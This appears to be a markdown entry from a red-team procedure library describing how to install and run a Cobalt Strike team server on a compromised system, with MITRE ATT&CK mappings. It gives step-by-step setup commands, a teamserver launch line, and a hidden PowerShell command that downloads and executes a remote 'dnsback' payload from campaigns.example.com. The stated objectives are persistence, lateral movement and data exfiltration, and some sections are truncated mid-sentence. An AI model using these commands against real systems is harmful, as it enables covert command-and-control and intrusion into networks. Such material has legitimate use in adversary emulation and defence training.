---
id: efb4b36b-e1c8-49b7-a137-3dae2796b14b
name: Cobalt Strike Team Server Installation and Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.231861+00:00'
updated_at: '2023-04-10T20:36:21.805073+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Data Encoding|T1132 - Data Encoding]]'
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
- '[[Server Software Component|T1505 - Server Software Component]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
tags:
- '[[Cobalt Strike]]'
commands:
- '[[Download and Execute DNSBack Payload]]'
- '[[Install Proxychains and Socat]]'
- '[[Set Java Alternatives]]'
- '[[Start Cobalt Strike]]'
- '[[Start Teamserver]]'
- '[[Update and Install OpenJDK]]'
---

# Cobalt Strike Team Server Installation and Execution

## Summary

Cobalt Strike is a commercial, post-exploitation tool that enables an attacker to emulate the activity of a legitimate user on a compromised system. The tool is often used by advanced threat actors to evade detection and maintain persistence within a network. Cobalt Strike can be used to execute a 

## Description

# Description

Cobalt Strike is a commercial, post-exploitation tool that enables an attacker to emulate the activity of a legitimate user on a compromised system. The tool is often used by advanced threat actors to evade detection and maintain persistence within a network. Cobalt Strike can be used to execute a variety of post-exploitation activities, such as lateral movement, privilege escalation, and data exfiltration.

Technical Description: Cobalt Strike consists of a client and a server component. The server component, known as the Cobalt Strike Team Server, is installed on a compromised system and provides the attacker with a command and control (C2) interface for managing compromised systems. The client component is used by the attacker to interact with the C2 server and issue commands to compromised systems.

Business Value: Cobalt Strike is a powerful tool for attackers looking to maintain a persistent presence within a network. The tool provides a wide range of post-exploitation capabilities that can be used to move laterally within a network, escalate privileges, and exfiltrate sensitive data. By using Cobalt Strike, attackers can evade detection and maintain access to compromised systems for extended periods of time.

 

## Requirements

1. Access to a compromised system

1. Ability to execute the Cobalt Strike Team Server binary

 

## Defense

1. Implement strong access controls to prevent unauthorized access to critical systems

1. Implement network segmentation to limit the spread of the attack

1. Use endpoint detection and response (EDR) tools to detect and respond to malicious activity

 

## Objectives

1. Install and execute the Cobalt Strike Team Server on a compromised system

1. Maintain persistence within a compromised network

1. Execute a variety of post-exploitation activities, such as lateral movement, privilege escalation, and data exfiltration

 

# Instructions

1. Install and execute Cobalt Strike Team Server

 



**Code**: [[$ sudo apt-get update
$ sudo apt-get install openj]]



> This command installs and executes Cobalt Strike Team Server. The command begins with updating the package index of the system using 'sudo apt-get update' command. Then, it installs the OpenJDK 11 JDK using 'sudo apt-get install openjdk-11-jdk' command. After that, it installs Proxychains and Socat using 'sudo apt install proxychains socat' command. Next, it sets the default Java version to 1.11.0 using 'sudo update-java-alternatives -s java-1.11.0-openjdk-amd64' command. Then, it executes the Cobalt Strike Team Server using './teamserver 10.10.10.10 "password" [malleable C2 profile]' command. Finally, it executes the Cobalt Strike client using './cobaltstrike' command and downloads and executes the 'dnsback' PowerShell script using 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"' command.



**Command** ([[Update and Install OpenJDK]]):

```bash
$ sudo apt-get update
$ sudo apt-get install openjdk-11-jdk
```





**Command** ([[Install Proxychains and Socat]]):

```bash
$ sudo apt install proxychains socat
```





**Command** ([[Set Java Alternatives]]):

```bash
$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
```





**Command** ([[Start Teamserver]]):

```bash
$ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
```





**Command** ([[Start Cobalt Strike]]):

```bash
$ ./cobaltstrike
```





**Command** ([[Download and Execute DNSBack Payload]]):

```bash
$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Data Encoding|T1132 - Data Encoding]]
- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]
- [[Server Software Component|T1505 - Server Software Component]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

## Commands Used

- [[Download and Execute DNSBack Payload]]
- [[Install Proxychains and Socat]]
- [[Set Java Alternatives]]
- [[Start Cobalt Strike]]
- [[Start Teamserver]]
- [[Update and Install OpenJDK]]

## Tags

- [[Cobalt Strike]]


